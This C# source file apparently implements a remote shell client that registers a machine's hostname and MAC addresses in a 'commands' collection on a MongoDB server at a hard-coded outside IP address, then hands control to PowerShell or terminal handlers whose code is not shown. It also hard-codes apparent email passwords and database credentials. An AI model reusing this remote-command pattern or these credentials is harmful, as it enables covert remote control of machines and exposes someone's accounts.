using MongoDB.Bson;
using MongoDB.Driver;
using System;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;

namespace client
{
    class SocketClient
    {
        static void Main(String[] args)
        {
            while(true)
            {
                string databaseip = "194.5.177.152";
                string databaseport = "27017";
                string myemail = "muhammadbozorgi@gmail.com";
                string myemailpass = "23676653";
                string myadminemail = "mohammadbozorgi0@gmail.com";
                string databseusername = "server";
                string databasepass = "server99";
                string mac = Environment.MachineName.ToString().Trim();
                try
                {
                    while (true)
                    {
                        using (TcpClient tcpClient = new TcpClient())
                        {
                            Ping p1 = new Ping();
                            PingReply PR = p1.Send("8.8.8.8");
                            try
                            {
                                tcpClient.Connect("194.5.177.152", 27017);
                                tcpClient.Close();
                                break;
                            }
                            catch (Exception)
                            {
                                if (PR.Status.ToString().Equals("Success"))
                                { 
                                        Console.WriteLine("Port closed please open 27017 port for connecting to mydatabase");
                                }
                                Console.WriteLine("No internet please connect to internet first ");
                                Thread.Sleep(5000);
                            }
                        }
                    }
                    NetworkInterface[] adapters = NetworkInterface.GetAllNetworkInterfaces();
                    foreach (NetworkInterface adapter in adapters)
                    {
                        IPInterfaceProperties adapterProperties = adapter.GetIPProperties();
                        GatewayIPAddressInformationCollection addresses = adapterProperties.GatewayAddresses;
                        if (addresses.Count > 0)
                        {
                            foreach (GatewayIPAddressInformation address in addresses)
                            {
                                mac = mac + "@" + adapter.GetPhysicalAddress().ToString().Trim();
                            }
                        }
                    }
                    Console.WriteLine(mac);

                    BsonDocument doc = new BsonDocument();
                    doc.Add(new BsonElement("name", "server"));
                    doc.Add(new BsonElement("command", ""));
                    var dbClient1 = new MongoClient("mongodb://"+databseusername+":"+databasepass+"@" + databaseip + ":" + databaseport + "/admin");
                    IMongoDatabase commandsdatabase = dbClient1.GetDatabase("commands");
                    commandsdatabase.DropCollection(mac);
                    var commandscollection = commandsdatabase.GetCollection<BsonDocument>(mac);
                    commandscollection.InsertOne(doc);
                    if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                    {

                        ProcessAsyncStreamSamples.Powershell.CreatePowershellprocess(databaseip, databaseport, mac, myemail, myemailpass, myadminemail,databseusername,databasepass);
                    }

                    if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) || RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
                    {

                        ProcessAsyncStreamSamples.Terminal.CreateTerminalprocess(databaseip, databaseport, mac, myemail, myemailpass, myadminemail,databseusername,databasepass);
                    }
                }
                catch (Exception ex)
                {
                    try
                    {
                        BsonDocument doc1 = new BsonDocument();
                        doc1.Add(new BsonElement("error", ex.ToString()));
                        var dbClient1 = new MongoClient("mongodb://server:server99@" + databaseip + ":" + databaseport + "/admin");
                        IMongoDatabase commandsdatabase = dbClient1.GetDatabase("clienterror");
                        var commandscollection = commandsdatabase.GetCollection<BsonDocument>(mac);
                        commandscollection.InsertOne(doc1);
                        Console.WriteLine(ex.GetType().ToString());

                    }
                    catch(Exception ex1)
                    {
                        Console.WriteLine("I try to send error to database but I cant the error is: "+ex1.GetType().ToString());
                    }
                }
            }
             
        }
    }
}



